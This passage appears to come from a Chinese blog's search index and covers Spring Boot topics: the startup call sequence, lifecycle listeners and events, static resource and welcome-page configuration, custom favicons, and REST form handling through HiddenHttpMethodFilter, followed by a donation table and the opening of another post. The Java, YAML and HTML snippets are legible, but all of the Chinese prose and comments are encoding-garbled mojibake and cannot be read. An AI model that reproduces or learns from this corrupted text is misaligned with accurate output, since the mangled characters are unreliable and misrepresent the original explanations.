æ³•æ„ŸçŸ¥é…ç½®åº”è¯¥å¦‚ä½•ä¹¦å†™\n\nåˆ°æ­¤å½“å‰æ¡ˆä¾‹å…¨éƒ¨å®Œæˆï¼Œè‡ªå®šä¹‰staterçš„å¼€å‘å…¶å®åœ¨ç¬¬ä¸€è½®å¼€å‘ä¸­å°±å·²ç»å®Œæˆäº†ï¼Œå°±æ˜¯åˆ›å»ºç‹¬ç«‹æ¨¡å—å¯¼å‡ºç‹¬ç«‹åŠŸèƒ½ï¼Œéœ€è¦ä½¿ç”¨çš„ä½ç½®å¯¼å…¥å¯¹åº”çš„starterå³å¯ã€‚å¦‚æœæ˜¯åœ¨ä¼ä¸šä¸­å¼€å‘ï¼Œè®°å¾—ä¸ä»…éœ€è¦å°†å¼€å‘å®Œæˆçš„starteræ¨¡å—installåˆ°è‡ªå·±çš„æœ¬åœ°ä»“åº“ä¸­ï¼Œå¼€å‘å®Œæ¯•åè¿˜è¦deployåˆ°ç§æœä¸Šï¼Œå¦åˆ™åˆ«äººæ— æ³•ä½¿ç”¨ã€‚\n\n\n\n```bash\n\n```\n\n\n\n# 3.SpringBootç¨‹åºå¯åŠ¨\n\n## â‘ å¯åŠ¨è¿‡ç¨‹åˆ†æ\n\n> ä¸ç®¡æ˜¯springbootç¨‹åºè¿˜æ˜¯springç¨‹åºï¼Œå¯åŠ¨è¿‡ç¨‹æœ¬è´¨ä¸Šéƒ½æ˜¯åœ¨åšå®¹å™¨çš„åˆå§‹åŒ–ï¼Œå¹¶å°†å¯¹åº”çš„beanåˆå§‹åŒ–å‡ºæ¥æ”¾å…¥å®¹å™¨ã€‚åœ¨springç¯å¢ƒä¸­ï¼Œæ¯ä¸ªbeançš„åˆå§‹åŒ–éƒ½è¦å¼€å‘è€…è‡ªå·±æ·»åŠ è®¾ç½®ï¼Œä½†æ˜¯åˆ‡æ¢æˆspringbootç¨‹åºåï¼Œè‡ªåŠ¨é…ç½®åŠŸèƒ½çš„æ·»åŠ å¸®åŠ©å¼€å‘è€…æå‰é¢„è®¾äº†å¾ˆå¤šbeançš„åˆå§‹åŒ–è¿‡ç¨‹ï¼ŒåŠ ä¸Šå„ç§å„æ ·çš„å‚æ•°è®¾ç½®ï¼Œä½¿å¾—æ•´ä½“åˆå§‹åŒ–è¿‡ç¨‹æ˜¾å¾—æ›´ç®€å•ï¼Œä½†æ˜¯æ ¸å¿ƒæœ¬è´¨è¿˜æ˜¯åœ¨åšä¸€ä»¶äº‹ï¼Œåˆå§‹åŒ–å®¹å™¨ã€‚\n\nä½œä¸ºå¼€å‘è€…åªè¦ææ¸…æ¥šspringbootæä¾›äº†å“ªäº›å‚æ•°è®¾ç½®çš„ç¯èŠ‚ï¼ŒåŒæ—¶åˆå§‹åŒ–å®¹å™¨çš„è¿‡ç¨‹ä¸­éƒ½åšäº†å“ªäº›äº‹æƒ…å°±è¡Œäº†ã€‚springbootåˆå§‹åŒ–çš„å‚æ•°æ ¹æ®å‚æ•°çš„æä¾›æ–¹ï¼Œåˆ’åˆ†æˆå¦‚ä¸‹3ä¸ªå¤§ç±»ï¼Œæ¯ä¸ªå¤§ç±»çš„å‚æ•°åˆè¢«å°è£…äº†å„ç§å„æ ·çš„å¯¹è±¡ï¼Œå…·ä½“å¦‚ä¸‹ï¼š\n\n- ç¯å¢ƒå±æ€§ï¼ˆEnvironmentï¼‰\n- ç³»ç»Ÿé…ç½®ï¼ˆspring.factoriesï¼‰\n- å‚æ•°ï¼ˆArgumentsã€application.propertiesï¼‰\n\nä»¥ä¸‹é€šè¿‡ä»£ç æµå‘ä»‹ç»äº†springbootç¨‹åºå¯åŠ¨æ—¶æ¯ä¸€ç¯èŠ‚åšçš„å…·ä½“äº‹æƒ…ã€‚\n\n```java\nSpringboot30StartupApplicationã€10ã€‘->SpringApplication.run(Springboot30StartupApplication.class, args);\n    SpringApplicationã€1332ã€‘->return run(new Class<?>[] { primarySource }, args);\n        SpringApplicationã€1343ã€‘->return new SpringApplication(primarySources).run(args);\n            SpringApplicationã€1343ã€‘->SpringApplication(primarySources)\n            # åŠ è½½å„ç§é…ç½®ä¿¡æ¯ï¼Œåˆå§‹åŒ–å„ç§é…ç½®å¯¹è±¡\n                SpringApplicationã€266ã€‘->this(null, primarySources);\n                    SpringApplicationã€280ã€‘->public SpringApplication(ResourceLoader resourceLoader, Class<?>... primarySources)\n                        SpringApplicationã€281ã€‘->this.resourceLoader = resourceLoader;\n                        # åˆå§‹åŒ–èµ„æºåŠ è½½å™¨\n                        SpringApplicationã€283ã€‘->this.primarySources = new LinkedHashSet<>(Arrays.asList(primarySources));\n                        # åˆå§‹åŒ–é…ç½®ç±»çš„ç±»åä¿¡æ¯ï¼ˆæ ¼å¼è½¬æ¢ï¼‰\n                        SpringApplicationã€284ã€‘->this.webApplicationType = WebApplicationType.deduceFromClasspath();\n                        # ç¡®è®¤å½“å‰å®¹å™¨åŠ è½½çš„ç±»å‹\n                        SpringApplicationã€285ã€‘->this.bootstrapRegistryInitializers = getBootstrapRegistryInitializersFromSpringFactories();\n                        # è·å–ç³»ç»Ÿé…ç½®å¼•å¯¼ä¿¡æ¯\n                        SpringApplicationã€286ã€‘->setInitializers((Collection) getSpringFactoriesInstances(ApplicationContextInitializer.class));\n                        # è·å–ApplicationContextInitializer.classå¯¹åº”çš„å®ä¾‹\n                        SpringApplicationã€287ã€‘->setListeners((Collection) getSpringFactoriesInstances(ApplicationListener.class));\n                        # åˆå§‹åŒ–ç›‘å¬å™¨ï¼Œå¯¹åˆå§‹åŒ–è¿‡ç¨‹åŠè¿è¡Œè¿‡ç¨‹è¿›è¡Œå¹²é¢„\n                        SpringApplicationã€288ã€‘->this.mainApplicationClass = deduceMainApplicationClass();\n                        # åˆå§‹åŒ–äº†å¼•å¯¼ç±»ç±»åä¿¡æ¯ï¼Œå¤‡ç”¨\n            SpringApplicationã€1343ã€‘->new SpringApplication(primarySources).run(args)\n            # åˆå§‹åŒ–å®¹å™¨ï¼Œå¾—åˆ°ApplicationContextå¯¹è±¡\n                SpringApplicationã€323ã€‘->StopWatch stopWatch = new StopWatch();\n                # è®¾ç½®è®¡æ—¶å™¨\n                SpringApplicationã€324ã€‘->stopWatch.start();\n                # è®¡æ—¶å¼€å§‹\n                SpringApplicationã€325ã€‘->DefaultBootstrapContext bootstrapContext = createBootstrapContext();\n                # ç³»ç»Ÿå¼•å¯¼ä¿¡æ¯å¯¹åº”çš„ä¸Šä¸‹æ–‡å¯¹è±¡\n                SpringApplicationã€327ã€‘->configureHeadlessProperty();\n                # æ¨¡æ‹Ÿè¾“å…¥è¾“å‡ºä¿¡å·ï¼Œé¿å…å‡ºç°å› ç¼ºå°‘å¤–è®¾å¯¼è‡´çš„ä¿¡å·ä¼ è¾“å¤±è´¥ï¼Œè¿›è€Œå¼•å‘é”™è¯¯ï¼ˆæ¨¡æ‹Ÿæ˜¾ç¤ºå™¨ï¼Œé”®ç›˜ï¼Œé¼ æ ‡...ï¼‰\n                    java.awt.headless=true\n                SpringApplicationã€328ã€‘->SpringApplicationRunListeners listeners = getRunListeners(args);\n                # è·å–å½“å‰æ³¨å†Œçš„æ‰€æœ‰ç›‘å¬å™¨\n                SpringApplicationã€329ã€‘->listeners.starting(bootstrapContext, this.mainApplicationClass);\n                # ç›‘å¬å™¨æ‰§è¡Œäº†å¯¹åº”çš„æ“ä½œæ­¥éª¤\n                SpringApplicationã€331ã€‘->ApplicationArguments applicationArguments = new DefaultApplicationArguments(args);\n                # è·å–å‚æ•°\n                SpringApplicationã€333ã€‘->ConfigurableEnvironment environment = prepareEnvironment(listeners, bootstrapContext, applicationArguments);\n                # å°†å‰æœŸè¯»å–çš„æ•°æ®åŠ è½½æˆäº†ä¸€ä¸ªç¯å¢ƒå¯¹è±¡ï¼Œç”¨æ¥æè¿°ä¿¡æ¯\n                SpringApplicationã€333ã€‘->configureIgnoreBeanInfo(environment);\n                # åšäº†ä¸€ä¸ªé…ç½®ï¼Œå¤‡ç”¨\n                SpringApplicationã€334ã€‘->Banner printedBanner = printBanner(environment);\n                # åˆå§‹åŒ–logo\n                SpringApplicationã€335ã€‘->context = createApplicationContext();\n                # åˆ›å»ºå®¹å™¨å¯¹è±¡ï¼Œæ ¹æ®å‰æœŸé…ç½®çš„å®¹å™¨ç±»å‹è¿›è¡Œåˆ¤å®šå¹¶åˆ›å»º\n                SpringApplicationã€363ã€‘->context.setApplicationStartup(this.applicationStartup);\n                # è®¾ç½®å¯åŠ¨æ¨¡å¼\n                SpringApplicationã€337ã€‘->prepareContext(bootstrapContext, context, environment, listeners, applicationArguments, printedBanner);\n                # å¯¹å®¹å™¨è¿›è¡Œè®¾ç½®ï¼Œå‚æ•°æ¥æºäºå‰æœŸçš„è®¾å®š\n                SpringApplicationã€338ã€‘->refreshContext(context);\n                # åˆ·æ–°å®¹å™¨ç¯å¢ƒ\n                SpringApplicationã€339ã€‘->afterRefresh(context, applicationArguments);\n                # åˆ·æ–°å®Œæ¯•ååšåå¤„ç†\n                SpringApplicationã€340ã€‘->stopWatch.stop();\n                # è®¡æ—¶ç»“æŸ\n                SpringApplicationã€341ã€‘->if (this.logStartupInfo) {\n                # åˆ¤å®šæ˜¯å¦è®°å½•å¯åŠ¨æ—¶é—´çš„æ—¥å¿—\n                SpringApplicationã€342ã€‘->    new StartupInfoLogger(this.mainApplicationClass).logStarted(getApplicationLog(), stopWatch);\n                # åˆ›å»ºæ—¥å¿—å¯¹åº”çš„å¯¹è±¡ï¼Œè¾“å‡ºæ—¥å¿—ä¿¡æ¯ï¼ŒåŒ…å«å¯åŠ¨æ—¶é—´\n                SpringApplicationã€344ã€‘->listeners.started(context);\n                # ç›‘å¬å™¨æ‰§è¡Œäº†å¯¹åº”çš„æ“ä½œæ­¥éª¤\n                SpringApplicationã€345ã€‘->callRunners(context, applicationArguments);\n                # è°ƒç”¨è¿è¡Œå™¨\n                SpringApplicationã€353ã€‘->listeners.running(context);\n                # ç›‘å¬å™¨æ‰§è¡Œäº†å¯¹åº”çš„æ“ä½œæ­¥éª¤\n```\n\nä¸Šè¿°è¿‡ç¨‹æè¿°äº†springbootç¨‹åºå¯åŠ¨è¿‡ç¨‹ä¸­åšçš„æ‰€æœ‰çš„äº‹æƒ…ã€‚\n\n## â‘¡å¹²é¢„å¯åŠ¨è¿‡ç¨‹\n\nå¦‚æœæƒ³å¹²é¢„springbootçš„å¯åŠ¨è¿‡ç¨‹ï¼Œæ¯”å¦‚è‡ªå®šä¹‰ä¸€ä¸ªæ•°æ®åº“ç¯å¢ƒæ£€æµ‹çš„ç¨‹åºï¼Œè¯¥å¦‚ä½•å°†è¿™ä¸ªè¿‡ç¨‹åŠ å…¥springbootçš„å¯åŠ¨æµç¨‹å‘¢ï¼Ÿé‡åˆ°è¿™æ ·çš„é—®é¢˜ï¼Œå¤§éƒ¨åˆ†æŠ€æœ¯æ˜¯è¿™æ ·è®¾è®¡çš„ï¼Œè®¾è®¡è‹¥å¹²ä¸ªæ ‡å‡†æ¥å£ï¼Œå¯¹åº”ç¨‹åºä¸­çš„æ‰€æœ‰æ ‡å‡†è¿‡ç¨‹ã€‚å½“ä½ æƒ³å¹²é¢„æŸä¸ªè¿‡ç¨‹æ—¶ï¼Œå®ç°æ¥å£å°±è¡Œäº†ã€‚ä¾‹å¦‚springæŠ€æœ¯ä¸­beançš„ç”Ÿå‘½å‘¨æœŸç®¡ç†å°±æ˜¯é‡‡ç”¨æ ‡å‡†æ¥å£è¿›è¡Œçš„ã€‚\n\n```java\npublic class Abc implements InitializingBean, DisposableBean {\n    public void destroy() throws Exception {\n        //é”€æ¯æ“ä½œ\n    }\n    public void afterPropertiesSet() throws Exception {\n        //åˆå§‹åŒ–æ“ä½œ\n    }\n}\n```\n\nspringbootå¯åŠ¨è¿‡ç¨‹ç”±äºå­˜åœ¨ç€å¤§é‡çš„è¿‡ç¨‹é˜¶æ®µï¼Œå¦‚æœè®¾è®¡æ¥å£å°±è¦è®¾è®¡åä½™ä¸ªæ ‡å‡†æ¥å£ï¼Œè¿™æ ·å¯¹å¼€å‘è€…ä¸å‹å¥½ï¼ŒåŒæ—¶æ•´ä½“è¿‡ç¨‹ç®¡ç†åˆ†æ•£ï¼Œåä½™ä¸ªè¿‡ç¨‹å„è‡ªä¸ºæ”¿ï¼Œç®¡ç†éš¾åº¦å¤§ï¼Œè¿‡ç¨‹è¿‡äºæ¾æ•£ã€‚é‚£springbootå¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿå®ƒé‡‡ç”¨äº†ä¸€ç§æœ€åŸå§‹çš„è®¾è®¡æ¨¡å¼æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè¿™å°±æ˜¯`ç›‘å¬å™¨æ¨¡å¼`ï¼Œä½¿ç”¨ç›‘å¬å™¨æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚\n\nspringbootå°†è‡ªèº«çš„å¯åŠ¨è¿‡ç¨‹æ¯”å–»æˆä¸€ä¸ªå¤§çš„äº‹ä»¶ï¼Œè¯¥äº‹ä»¶æ˜¯ç”±è‹¥å¹²ä¸ªå°çš„äº‹ä»¶ç»„æˆçš„ã€‚ä¾‹å¦‚ï¼š\n\n- org.springframework.boot.context.event.ApplicationStartingEvent\n  - åº”ç”¨å¯åŠ¨äº‹ä»¶ï¼Œåœ¨åº”ç”¨è¿è¡Œä½†æœªè¿›è¡Œä»»ä½•å¤„ç†æ—¶ï¼Œå°†å‘é€ ApplicationStartingEvent\n- org.springframework.boot.context.event.ApplicationEnvironmentPreparedEvent\n  - ç¯å¢ƒå‡†å¤‡äº‹ä»¶ï¼Œå½“Environmentè¢«ä½¿ç”¨ï¼Œä¸”ä¸Šä¸‹æ–‡åˆ›å»ºä¹‹å‰ï¼Œå°†å‘é€ ApplicationEnvironmentPreparedEvent\n- org.springframework.boot.context.event.ApplicationContextInitializedEvent\n  - ä¸Šä¸‹æ–‡åˆå§‹åŒ–äº‹ä»¶\n- org.springframework.boot.context.event.ApplicationPreparedEvent\n  - åº”ç”¨å‡†å¤‡äº‹ä»¶ï¼Œåœ¨å¼€å§‹åˆ·æ–°ä¹‹å‰ï¼Œbeanå®šä¹‰è¢«åŠ è½½ä¹‹åå‘é€ ApplicationPreparedEvent\n- org.springframework.context.event.ContextRefreshedEvent\n  - ä¸Šä¸‹æ–‡åˆ·æ–°äº‹ä»¶\n- org.springframework.boot.context.event.ApplicationStartedEvent\n  - åº”ç”¨å¯åŠ¨å®Œæˆäº‹ä»¶ï¼Œåœ¨ä¸Šä¸‹æ–‡åˆ·æ–°ä¹‹åä¸”æ‰€æœ‰çš„åº”ç”¨å’Œå‘½ä»¤è¡Œè¿è¡Œå™¨è¢«è°ƒç”¨ä¹‹å‰å‘é€ ApplicationStartedEvent\n- org.springframework.boot.context.event.ApplicationReadyEvent\n  - åº”ç”¨å‡†å¤‡å°±ç»ªäº‹ä»¶ï¼Œåœ¨åº”ç”¨ç¨‹åºå’Œå‘½ä»¤è¡Œè¿è¡Œå™¨è¢«è°ƒç”¨ä¹‹åï¼Œå°†å‘å‡º ApplicationReadyEventï¼Œç”¨äºé€šçŸ¥åº”ç”¨å·²ç»å‡†å¤‡å¤„ç†è¯·æ±‚\n- org.springframework.context.event.ContextClosedEventï¼ˆä¸Šä¸‹æ–‡å…³é—­äº‹ä»¶ï¼Œå¯¹åº”å®¹å™¨å…³é—­ï¼‰\n\nä¸Šè¿°åˆ—å‡ºçš„ä»…ä»…æ˜¯éƒ¨åˆ†äº‹ä»¶ï¼Œå½“åº”ç”¨å¯åŠ¨åèµ°åˆ°æŸä¸€ä¸ªè¿‡ç¨‹ç‚¹æ—¶ï¼Œç›‘å¬å™¨ç›‘å¬åˆ°æŸä¸ªäº‹ä»¶è§¦å‘ï¼Œå°±ä¼šæ‰§è¡Œå¯¹åº”çš„äº‹ä»¶ã€‚é™¤äº†ç³»ç»Ÿå†…ç½®çš„äº‹ä»¶å¤„ç†ï¼Œç”¨æˆ·å°±å¯ä»¥æ ¹æ®éœ€è¦è‡ªå®šä¹‰å¼€å‘å½“å‰äº‹ä»¶è§¦å‘æ—¶è¦åšçš„åŠ¨ä½œã€‚\n\n```JAVA\n//è®¾å®šç›‘å¬å™¨ï¼Œåœ¨åº”ç”¨å¯åŠ¨å¼€å§‹äº‹ä»¶æ—¶è¿›è¡ŒåŠŸèƒ½è¿½åŠ \npublic class MyListener implements ApplicationListener<ApplicationStartingEvent> {\n    public void onApplicationEvent(ApplicationStartingEvent event) {\n\t\t//è‡ªå®šä¹‰äº‹ä»¶å¤„ç†é€»è¾‘\n    }\n}\n```\n\næŒ‰ç…§ä¸Šè¿°æ–¹æ¡ˆå¤„ç†ï¼Œç”¨æˆ·å°±å¯ä»¥å¹²é¢„springbootå¯åŠ¨è¿‡ç¨‹çš„æ‰€æœ‰å·¥ä½œèŠ‚ç‚¹ï¼Œè®¾ç½®è‡ªå·±çš„ä¸šåŠ¡ç³»ç»Ÿä¸­ç‹¬æœ‰çš„åŠŸèƒ½ç‚¹ã€‚\n\n**æ€»ç»“**\n\n1. springbootå¯åŠ¨æµç¨‹æ˜¯å…ˆåˆå§‹åŒ–å®¹å™¨éœ€è¦çš„å„ç§é…ç½®ï¼Œå¹¶åŠ è½½æˆå„ç§å¯¹è±¡ï¼Œåˆå§‹åŒ–å®¹å™¨æ—¶è¯»å–è¿™äº›å¯¹è±¡ï¼Œåˆ›å»ºå®¹å™¨\n2. æ•´ä½“æµç¨‹é‡‡ç”¨äº‹ä»¶ç›‘å¬çš„æœºåˆ¶è¿›è¡Œè¿‡ç¨‹æ§åˆ¶ï¼Œå¼€å‘è€…å¯ä»¥æ ¹æ®éœ€è¦è‡ªè¡Œæ‰©å±•ï¼Œæ·»åŠ å¯¹åº”çš„ç›‘å¬å™¨ç»‘å®šå…·ä½“äº‹ä»¶ï¼Œå°±å¯ä»¥åœ¨äº‹ä»¶è§¦å‘ä½ç½®æ‰§è¡Œå¼€å‘è€…çš„ä¸šåŠ¡ä»£ç \n\n\n\n# 4.Webå¼€å‘\n\n## 1.SpringMVCè‡ªåŠ¨é…ç½®æ¦‚è§ˆ\n\n- å†…å®¹åå•†è§†å›¾è§£æå™¨å’ŒBeanNameè§†å›¾è§£æå™¨\n\n- é™æ€èµ„æºï¼ˆåŒ…æ‹¬webjarsï¼‰\n- è‡ªåŠ¨æ³¨å†Œ `Converterï¼ŒGenericConverterï¼ŒFormatter `\n- æ”¯æŒ `HttpMessageConverters` \n- è‡ªåŠ¨æ³¨å†Œ `MessageCodesResolver` ï¼ˆå›½é™…åŒ–ï¼‰\n- é™æ€index.html é¡µæ”¯æŒ\n- è‡ªå®šä¹‰ `Favicon`\n- è‡ªåŠ¨ä½¿ç”¨ `ConfigurableWebBindingInitializer` ï¼ˆDataBinderè´Ÿè´£å°†è¯·æ±‚æ•°æ®ç»‘å®šåˆ°JavaBeanä¸Šï¼‰\n\n## 2.é™æ€èµ„æºè®¿é—®\n\n### a.é™æ€èµ„æºç›®å½•\n\n**é»˜è®¤é™æ€èµ„æºè·¯å¾„**ï¼š  `/static` or `/public` or `/resources` or `/META-INF/resources`\n\n**è®¿é—® ï¼š** `å½“å‰é¡¹ç›®æ ¹è·¯å¾„/é™æ€èµ„æºå`   ä¾‹å¦‚ï¼š127.0.0.1/jianjian.png\n\n**åŸç†ï¼š**å½“è¯·æ±‚è¿›æ¥æ—¶ï¼Œå…ˆå»æ‰¾ Controller çœ‹èƒ½ä¸èƒ½å¤„ç†ã€‚ä¸èƒ½å¤„ç†çš„æ‰€æœ‰è¯·æ±‚åˆéƒ½äº¤ç»™é™æ€èµ„æºå¤„ç†å™¨ã€‚é™æ€èµ„æºä¹Ÿæ‰¾ä¸åˆ°åˆ™å“åº”404é¡µé¢ã€‚\n\n**ä¿®æ”¹é»˜è®¤çš„é™æ€èµ„æºè·¯å¾„**ï¼Œ/staticï¼Œ/publicï¼Œresourcesï¼Œ/META-INF/resources å°†å¤±æ•ˆ\n\n```yaml\nspring:\n\tweb:\n\t\tresources:\n  \t\tstatic-locations: [classpath:/jianjian/]\n```\n\n**é™æ€èµ„æºè®¿é—®å‰ç¼€**\n\n```yaml\nspring:\n  mvc:\n    static-path-pattern: /res/**\n```\n\nè®¿é—® ï¼š`å½“å‰é¡¹ç›®æ ¹è·¯å¾„ + static-path-pattern + é™æ€èµ„æºå`\n\nä¾‹å¦‚ï¼š127.0.0.1/res/jianjian.png\n\n**webjar**\n\nå¯ç”¨jaræ–¹å¼æ·»åŠ cssï¼Œjsç­‰èµ„æºæ–‡ä»¶ï¼Œwebjar æŸ¥æ‰¾ï¼šhttps://www.webjars.org/ï¼Œä¾‹å¦‚ï¼Œæ·»åŠ jquery\n\n```xml\n<dependency>\n    <groupId>org.webjars</groupId>\n    <artifactId>jquery</artifactId>\n    <version>3.5.1</version>\n</dependency>\n```\n\nè®¿é—®ï¼š`localhost:8080/webjars/jquery/3.5.1/jquery.js` ï¼Œåé¢åœ°å€è¦æŒ‰ç…§ä¾èµ–é‡Œé¢çš„åŒ…è·¯å¾„ã€‚\n\n### b.æ¬¢è¿é¡µæ”¯æŒ\n\n- é™æ€èµ„æºè·¯å¾„ä¸‹ index.html\n  - å¯ä»¥é…ç½®é™æ€èµ„æºè·¯å¾„\n  - é…ç½®**é™æ€èµ„æºçš„è®¿é—®å‰ç¼€**ï¼Œä¼šå¯¼è‡´ index.htmlä¸èƒ½è¢«é»˜è®¤è®¿é—®\n\n```yaml\nspring:\n#  mvc:\n#    static-path-pattern: /res/**   è¿™ä¸ªä¼šå¯¼è‡´æ¬¢è¿é¡µåŠŸèƒ½å¤±æ•ˆ\n\tweb:\n\t\tresources:\n\t\t\tstatic-locations: [classpath:/haha/]\n```\n\n- controllerå¤„ç†index\n\n```java\n@RequestMapping(\"/\")\npublic String home(){\n  return \"index\";\n}\n```\n\n### c.è‡ªå®šä¹‰Favicon\n\nå°† favicon.ico æ”¾åœ¨é™æ€èµ„æºç›®å½•ä¸‹å³å¯ï¼Œä½†æ˜¯é…ç½®**é™æ€èµ„æºè®¿é—®å‰ç¼€**ä¼šå¯¼è‡´ Favicon åŠŸèƒ½å¤±æ•ˆ\n\n```yaml\nspring:\n#  mvc:\n#    static-path-pattern: /res/**   è¿™ä¸ªä¼šå¯¼è‡´ Favicon åŠŸèƒ½å¤±æ•ˆ\n```\n\n### d.é™æ€èµ„æºé…ç½®åŸç†\n\nã€‚ã€‚ã€‚\n\n## 3.è¯·æ±‚å‚æ•°å¤„ç†\n\n### a.restä½¿ç”¨ä¸åŸç†\n\n- @xxxMapping\n\n  - @GetMapping\n  - @PostMapping\n  - @PutMapping\n  - @DeleteMapping\n\n- Resté£æ ¼æ”¯æŒï¼ˆ*ä½¿ç”¨**HTTP**è¯·æ±‚æ–¹å¼åŠ¨è¯æ¥è¡¨ç¤ºå¯¹èµ„æºçš„æ“ä½œ*ï¼‰\n\n  - ä»¥å‰ï¼š\n    - `/getUser`  è·å–ç”¨æˆ·  \n    - `/deleteUser` åˆ é™¤ç”¨æˆ·   \n    - `/editUser`  ä¿®æ”¹ç”¨æˆ·     \n    - `/saveUser` ä¿å­˜ç”¨æˆ·\n\n  - ç°åœ¨ï¼š `/user`   \n    -  GET-è·å–ç”¨æˆ·    \n    -  DELETE-åˆ é™¤ç”¨æˆ·    \n    -  PUT-ä¿®æ”¹ç”¨æˆ·   \n    -  POST-ä¿å­˜ç”¨æˆ·\n\n- æ ¸å¿ƒFilterï¼šHiddenHttpMethodFilter\n\n**ç”¨æ³•**\n\n- 1.å¼€å¯é¡µé¢è¡¨å•çš„ReståŠŸèƒ½\n\n```yaml\nspring:\n  mvc:\n    hiddenmethod:\n      filter:\n        enabled: true   #å¼€å¯é¡µé¢è¡¨å•çš„ReståŠŸèƒ½\n```\n\n- 2.é¡µé¢ formçš„å±æ€§method=postï¼Œéšè—åŸŸ _method=putã€deleteç­‰ï¼ˆå¦‚æœç›´æ¥getæˆ–postï¼Œæ— éœ€éšè—åŸŸï¼‰\n\n```html\n<form action=\"/user\" method=\"get\">\n    <input value=\"REST-GETæäº¤\" type=\"submit\" />\n</form>\n\n<form action=\"/user\" method=\"post\">\n    <input value=\"REST-POSTæäº¤\" type=\"submit\" />\n</form>\n\n<form action=\"/user\" method=\"post\">\n    <input name=\"_method\" type=\"hidden\" value=\"DELETE\"/>\n    <input value=\"REST-DELETE æäº¤\" type=\"submit\"/>\n</form>\n\n<form action=\"/user\" method=\"post\">\n    <input name=\"_method\" type=\"hidden\" value=\"PUT\" />\n    <input value=\"REST-PUTæäº¤\"type=\"submit\" />\n<form>\n\n```\n\n- 3.ç¼–å†™è¯·æ±‚æ˜ å°„\n\n```java\n    @RequestMapping(value = \"/user\",method = RequestMethod.GET)\n    public String getUser(){\n        return \"GET-å¼ ä¸‰\";\n    }\n\n    @RequestMapping(value = \"/user\",method = RequestMethod.POST)\n    public String saveUser(){\n        return \"POST-å¼ ä¸‰\";\n    }\n\n\n    @RequestMapping(value = \"/user\",method = RequestMethod.PUT)\n    public String putUser(){\n        return \"PUT-å¼ ä¸‰\";\n    }\n\n    @RequestMapping(value = \"/user\",method = RequestMethod.DELETE)\n    public String deleteUser(){\n        return \"DELETE-å¼ ä¸‰\";\n    }\n```\n\nReståŸç†ï¼ˆè¡¨å•æäº¤è¦ä½¿ç”¨RESTçš„æ—¶å€™ï¼‰\n\n- è¡¨å•æäº¤ä¼šå¸¦ä¸Š `_method=PUT`\n\n- è¯·æ±‚è¿‡æ¥è¢« `HiddenHttpMethodFilter`æ‹¦æˆªï¼Œæ£€æµ‹è¯·æ±‚æ˜¯å¦æ­£å¸¸ï¼Œå¹¶ä¸”æ˜¯POST\n\n  - è·å–åˆ° `_method` çš„å€¼\n\n  - å…¼å®¹ä»¥ä¸‹è¯·æ±‚ï¼›**PUT**ã€**DELETE**ã€**PATCH**\n\n  - åŸç”Ÿrequestï¼ˆpostï¼‰ï¼ŒåŒ…è£…æ¨¡å¼ requesWrapper é‡å†™äº†getMethodæ–¹æ³•ï¼Œè¿”å›çš„æ˜¯ä¼ å…¥çš„å€¼( `_method`)ã€‚\n\n  - è¿‡æ»¤å™¨é“¾æ”¾è¡Œçš„æ—¶å€™ç”¨ wrapperã€‚ä»¥åçš„æ–¹æ³•è°ƒç”¨getMethodæ˜¯è°ƒç”¨ requesWrapper \n\n### b.è¯·æ±‚æ˜ å°„åŸç†\n\n\n\n\n\n\n\n# Sponsorâ¤ï¸\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["SpringBoot"],"categories":["Spring"]},{"title":"SpringBoot-å®ç”¨ç¯‡","url":"/posts/37881.html","content":"\n> å®ç”¨ç¯‡åŒ…å«è¿ç»´å®ç”¨ç¯‡å’Œå¼€å‘å®ç”¨ç¯‡ï¼Œè¿ç»´å®ç”¨ç¯‡çš„å®šä½æ˜¯ç©è½¬é…ç½®ï¼›å¼€å‘å®ç”¨ç¯‡åŒ…å«çƒ­éƒ¨ç½²ã€é«˜çº§é…ç½®ã€æµ‹è¯•è¿›é˜¶ã€å†…ç½®æ•°æ®å±‚ã€ç›‘æ§ç­‰ã€‚\n\nå°ç®€ä» 0 å¼€å§‹å­¦ Java çŸ¥è¯†ä¹‹ [Java-å­¦ä¹ è·¯çº¿](https://jwt1399.top/posts/29829.html) ä¸­çš„ã€ŠSpringBoot-å®ç”¨ç¯‡ã€‹ï¼Œä¸å®šæœŸæ›´æ–°æ‰€å­¦ç¬”è®°ï¼ŒæœŸå¾…ä¸€å¹´åçš„èœ•å˜å§ï¼<æœ‰åŒæ ·æƒ³æ³•çš„å°ä¼™ä¼´ï¼Œå¯ä»¥è”ç³»æˆ‘ä¸€èµ·äº¤æµå­¦ä¹ å“¦ï¼>\n\n- [x] ğŸš©æ—¶é—´å®‰æ’ï¼šé¢„è®¡5å¤©æ›´æ–°å®Œ\n- [x] ğŸ¯å¼€å§‹æ—¶é—´ï¼š09-11\n- [x] ğŸ‰ç»“æŸæ—¶é—´ï¼š09-14\n- [x] ğŸ€æ€»ç»“ï¼š\n\n- å­¦ä¹ ç›®æ ‡\n\n| ç« èŠ‚                                       | å­¦ä¹ ç›®æ ‡                                                     |\n| ------------------------------------------ | ------------------------------------------------------------ |\n| <font color=\"#cc0000\"><b>åº”ç”¨ç¯‡</b></font> | 